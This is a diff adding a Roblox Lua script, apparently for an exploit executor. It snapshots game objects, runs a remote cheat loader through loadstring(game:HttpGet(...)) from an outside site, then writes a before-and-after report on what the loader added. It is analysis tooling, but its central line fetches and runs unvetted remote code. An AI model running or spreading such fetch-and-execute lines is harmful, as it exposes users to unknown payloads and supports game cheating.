@@ -1,0 +1,134 @@
+-- Lightweight LocalScript - focus on scripts/remotes/touch/click/proximity - no deep scans
+-- Should NOT lag or crash even in big games
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+local interestingClasses = {
+    "Script", "LocalScript", "ModuleScript",
+    "RemoteEvent", "RemoteFunction",
+    "BindableEvent", "BindableFunction",
+    "TouchTransmitter", "TouchInterest",
+    "ClickDetector", "ProximityPrompt"
+}
+
+local fastContainers = {
+    game:GetService("ReplicatedStorage"),
+    LocalPlayer:WaitForChild("PlayerScripts", 5),
+    LocalPlayer:WaitForChild("PlayerGui", 5),
+    game:GetService("CoreGui"),
+    -- Add ReplicatedFirst or StarterGui if needed, but keep minimal
+}
+
+local function getLightSnapshot()
+    local snap = {
+        objects = {},  -- "Class | Name | ParentName"
+        extraLoopsRough = 0  -- very basic counter of suspicious fast loops
+    }
+
+    for _, cont in ipairs(fastContainers) do
+        if not cont then continue end
+
+        for _, obj in ipairs(cont:GetChildren()) do  -- shallow only!
+            if table.find(interestingClasses, obj.ClassName) then
+                local parentName = obj.Parent and obj.Parent.Name or "?"
+                local key = string.format("%s | %s | Parent: %s", obj.ClassName, obj.Name, parentName)
+                snap.objects[key] = (snap.objects[key] or 0) + 1
+            end
+        end
+    end
+
+    -- Super rough extra loop detection: count how many fast connections we can see
+    -- (won't catch hidden ones, but spikes can hint at cheats)
+    if getconnections then
+        local hb = #getconnections(RunService.Heartbeat)
+        local rs = #getconnections(RunService.RenderStepped)
+        snap.extraLoopsRough = hb + rs
+    end
+
+    return snap
+end
+
+print("[LIGHT SCAN] BEFORE snapshot (fast & shallow)...")
+local before = getLightSnapshot()
+print("[LIGHT SCAN] BEFORE done")
+
+-- Run the loadstring
+print("[EXEC] Running loadstring...")
+local ok, err = pcall(function()
+    loadstring(game:HttpGet("https://init.frostbyte.lol", true))()
+end)
+if not ok then
+    warn("[EXEC FAIL] " .. tostring(err))
+end
+
+print("[WAIT] Waiting 20 seconds (many loaders delay GUI/hooks)...")
+task.wait(20)
+
+print("[LIGHT SCAN] AFTER snapshot...")
+local after = getLightSnapshot()
+print("[LIGHT SCAN] AFTER done")
+
+-- Build simple report
+local report = {}
+table.insert(report, "Light Anticheat-Relevant Diff Report")
+table.insert(report, os.date("%Y-%m-%d %H:%M:%S"))
+table.insert(report, "──────────────────────────────────")
+table.insert(report, "")
+
+local changes = false
+
+table.insert(report, "CHANGES IN SCRIPTS / REMOTES / TOUCH / CLICK / PROXIMITY:")
+for key, bCount in pairs(before.objects) do
+    local aCount = after.objects[key] or 0
+    if aCount > bCount then
+        table.insert(report, "   + " .. key .. " (+" .. (aCount - bCount) .. ")")
+        changes = true
+    elseif aCount < bCount then
+        table.insert(report, "   − " .. key .. " (-" .. (bCount - aCount) .. ")")
+        changes = true
+    end
+end
+for key, aCount in pairs(after.objects) do
+    if not before.objects[key] then
+        table.insert(report, "   + NEW: " .. key)
+        changes = true
+    end
+end
+if not changes then
+    table.insert(report, "   (No changes found - most likely hidden or no new Instances)")
+end
+table.insert(report, "")
+
+if getconnections then
+    local beforeLoops = before.extraLoopsRough
+    local afterLoops = after.extraLoopsRough
+    table.insert(report, "Rough loop connections change:")
+    if afterLoops > beforeLoops + 5 then
+        table.insert(report, "   + Suspicious spike (+" .. (afterLoops - beforeLoops) .. ")")
+    elseif afterLoops < beforeLoops then
+        table.insert(report, "   − Dropped (" .. (beforeLoops - afterLoops) .. ")")
+    else
+        table.insert(report, "   (Stable)")
+    end
+else
+    table.insert(report, "Note: getconnections not available in your exploit → no loop check")
+end
+
+table.insert(report, "")
+table.insert(report, "This is VERY limited (shallow scan only). Modern cheats rarely add visible Instances/remotes.")
+table.insert(report, "If still nothing shows → payload uses memory-only hooks / existing remotes / metatables.")
+
+-- Save
+local filename = "LightAnticheatDiff.txt"
+local success = pcall(writefile, filename, table.concat(report, "\n"))
+
+if success then
+    print("[SAVED] → " .. filename .. " (check exploit files tab)")
+else
+    warn("[SAVE FAIL] Dumping to console:")
+    for _, line in ipairs(report) do print(line) end
+end
+
+print("Done - should be lag-free now.")
